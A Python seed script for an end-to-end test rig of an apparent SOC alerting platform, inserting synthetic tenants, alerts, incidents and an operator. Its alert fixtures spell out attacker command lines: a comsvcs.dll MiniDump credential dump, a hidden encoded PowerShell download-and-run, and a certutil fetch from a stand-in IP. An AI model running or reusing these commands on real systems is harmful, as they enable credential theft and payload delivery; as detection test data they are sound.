"""Seed synthetic tenants, alerts and one SOC operator for the disposable E2E rig."""
import os
import sys

sys.path.insert(0, "/app")
from app.core.security import hash_password  # noqa: E402
from app.db.session import execute, fetch_one  # noqa: E402

creds = dict(line.strip().split("=", 1) for line in open(os.environ["E2E_CREDENTIALS_FILE"]) if "=" in line)
TENANTS = (("eeeeeeee-0000-0000-0000-00000000000a", "E2E Customer A", "E2EA"), ("eeeeeeee-0000-0000-0000-00000000000b", "E2E Customer B", "E2EB"))
for tid, name, code in TENANTS:
    execute("INSERT INTO tenants (id, name, short_code) VALUES (%s::uuid, %s, %s) ON CONFLICT DO NOTHING;", (tid, name, code))
execute("DELETE FROM security_alerts WHERE tenant_id IN (%s::uuid, %s::uuid);", (TENANTS[0][0], TENANTS[1][0]))
ALERTS = (
    # tenant, severity, title, host, age, user, parent process, parent command line
    (TENANTS[0][0], "critical", "Credential dumping tool run on HOST-A1", "HOST-A1", "3 hours", "E2EA\\svc-backup", "C:\\Windows\\System32\\cmd.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Temp\\l.dmp full"),
    (TENANTS[0][0], "critical", "Ransomware-like file renames on HOST-A2", "HOST-A2", "1 hour", "E2EA\\j.doe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\winword.exe", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
    (TENANTS[0][0], "high", "Suspicious service install on HOST-A3", "HOST-A3", "5 hours", None, None, None),
    (TENANTS[0][0], "medium", "Certutil download on HOST-A2", "HOST-A2", "70 minutes", "E2EA\\j.doe", "C:\\Windows\\System32\\cmd.exe", "certutil.exe -urlcache -split -f http://203.0.113.7/a.bin C:\\Users\\Public\\a.bin"),
    (TENANTS[1][0], "critical", "Critical in customer B", "HOST-B1", "2 hours", None, None, None),
)
execute("DELETE FROM incidents WHERE tenant_id IN (%s::uuid, %s::uuid);", (TENANTS[0][0], TENANTS[1][0]))
execute("DELETE FROM protected_assets WHERE tenant_id IN (%s::uuid, %s::uuid);", (TENANTS[0][0], TENANTS[1][0]))
execute(
    "INSERT INTO protected_assets (tenant_id, hostname, asset_type, os_name, criticality, owner, status, last_seen_at) "
    "VALUES (%s::uuid, 'HOST-A2', 'workstation', 'Windows 11', 'high', 'Finance', 'active', now() - interval '5 minutes');",
    (TENANTS[0][0],),
)
for n, (tid, sev, title, host, age, user, parent, cmd) in enumerate(ALERTS, 1):
    row = fetch_one(
        "INSERT INTO security_alerts (tenant_id, source_tool, severity, alert_title, alert_description, destination_host, source_user, parent_process, parent_command_line, "
        "raw_event, status, created_at, event_time) VALUES (%s::uuid, 'wazuh', %s, %s, 'synthetic E2E alert', %s, %s, %s, %s, "
        "jsonb_build_object('rule', jsonb_build_object('id', %s::text, 'description', %s::text), 'synthetic', true), 'new', now() - %s::interval, now() - %s::interval) RETURNING id::text AS id;",
        (tid, sev, title, host, user, parent, cmd, str(92000 + n), title, age, age),
    )
    if sev == "critical":
        fetch_one(
            "INSERT INTO incidents (tenant_id, primary_alert_id, incident_number, title, severity, status) VALUES (%s::uuid, %s::uuid, %s, %s, %s, 'open') RETURNING id;",
            (tid, row["id"], f"INC-E2E-{n:03d}", title, sev),
        )
execute("DELETE FROM platform_users WHERE email = %s;", (creds["email"],))
fetch_one(
    "INSERT INTO platform_users (user_type, role, full_name, email, password_hash, status) VALUES ('admin', 'soc_analyst', 'E2E Operator', %s, %s, 'active') RETURNING id;",
    (creds["email"], hash_password(creds["password"])),
)
print("seeded: 2 tenants, 5 alerts, 3 incidents, 1 asset, 1 operator")
